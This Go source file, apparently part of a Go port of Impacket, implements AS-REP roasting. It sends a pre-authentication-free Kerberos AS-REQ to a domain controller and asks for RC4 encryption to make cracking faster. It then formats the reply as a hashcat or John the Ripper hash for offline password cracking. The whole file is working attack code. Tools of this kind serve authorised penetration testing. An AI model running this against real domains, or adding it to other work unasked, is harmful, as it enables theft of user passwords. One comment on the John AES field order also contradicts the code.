// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package kerberos

import (
	"fmt"
	"strings"

	"gopacket/pkg/transport"

	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// GetASREP fetches the AS-REP for a user and returns the hash.
// The format parameter controls the output: "hashcat" (default) or "john".
// Hashcat: $krb5asrep$23$user@REALM:checksum$data
// John:    $krb5asrep$user@REALM:checksum$data
func GetASREP(username, domain, kdcHost string, format ...string) (string, error) {
	outputFormat := "hashcat"
	if len(format) > 0 && format[0] != "" {
		outputFormat = format[0]
	}
	realm := strings.ToUpper(domain)

	cfg := config.New()
	cfg.LibDefaults.DefaultRealm = realm
	// Request RC4 (etype 23) for faster cracking - matches Impacket behavior
	cfg.LibDefaults.DefaultTktEnctypes = []string{"rc4-hmac"}
	cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{23}

	// Create Client Principal Name
	cName := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, username)

	// Create Server Principal Name (krbtgt/REALM)
	sName := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, "krbtgt/"+realm)

	// Create AS-REQ
	asReq, err := messages.NewASReq(realm, cfg, cName, sName)
	if err != nil {
		return "", fmt.Errorf("failed to create AS-REQ: %v", err)
	}

	// Marshall AS-REQ
	b, err := asReq.Marshal()
	if err != nil {
		return "", fmt.Errorf("failed to marshal AS-REQ: %v", err)
	}

	// Connect to KDC (Port 88)
	conn, err := transport.Dial("tcp", fmt.Sprintf("%s:%d", kdcHost, 88))
	if err != nil {
		return "", fmt.Errorf("failed to connect to KDC: %v", err)
	}
	defer conn.Close()

	// Send AS-REQ
	length := uint32(len(b))
	lengthBuf := []byte{
		byte(length >> 24),
		byte(length >> 16),
		byte(length >> 8),
		byte(length),
	}

	if _, err := conn.Write(append(lengthBuf, b...)); err != nil {
		return "", fmt.Errorf("failed to send AS-REQ: %v", err)
	}

	// Read Response Length
	respLengthBuf := make([]byte, 4)
	if _, err := conn.Read(respLengthBuf); err != nil {
		return "", fmt.Errorf("failed to read response length: %v", err)
	}
	respLength := uint32(respLengthBuf[0])<<24 | uint32(respLengthBuf[1])<<16 | uint32(respLengthBuf[2])<<8 | uint32(respLengthBuf[3])

	// Read Response Body
	respBuf := make([]byte, respLength)
	if _, err := conn.Read(respBuf); err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	// Unmarshal Response
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err != nil {
		// If it's not an AS-REP, it might be a KRB-ERROR (e.g. Pre-auth required)
		var krbErr messages.KRBError
		if errErr := krbErr.Unmarshal(respBuf); errErr == nil {
			return "", fmt.Errorf("KDC returned error: %s", krbErr.Error())
		}
		return "", fmt.Errorf("failed to unmarshal response: %v", err)
	}

	// Format hash based on output format and etype
	etype := asRep.EncPart.EType
	cipher := fmt.Sprintf("%x", asRep.EncPart.Cipher)

	var hash string
	if outputFormat == "john" {
		// John format
		if etype == 17 || etype == 18 {
			// AES etypes: $krb5asrep$etype$REALMuser$checksum$data
			// cipher[-12:] is checksum (last 24 hex chars), cipher[:-12] is data
			hash = fmt.Sprintf("$krb5asrep$%d$%s%s$%s$%s",
				etype,
				realm,
				username,
				cipher[:len(cipher)-24],
				cipher[len(cipher)-24:],
			)
		} else {
			// RC4 (etype 23): $krb5asrep$user@REALM:checksum$data (no etype number)
			hash = fmt.Sprintf("$krb5asrep$%s@%s:%s$%s",
				username,
				realm,
				cipher[:32],
				cipher[32:],
			)
		}
	} else {
		// Hashcat format (default)
		if etype == 17 || etype == 18 {
			// AES etypes: $krb5asrep$etype$user$REALM$checksum$data
			hash = fmt.Sprintf("$krb5asrep$%d$%s$%s$%s$%s",
				etype,
				username,
				realm,
				cipher[len(cipher)-24:],
				cipher[:len(cipher)-24],
			)
		} else {
			// RC4 (etype 23): $krb5asrep$23$user@REALM:checksum$data
			hash = fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
				etype,
				username,
				realm,
				cipher[:32],
				cipher[32:],
			)
		}
	}

	return hash, nil
}
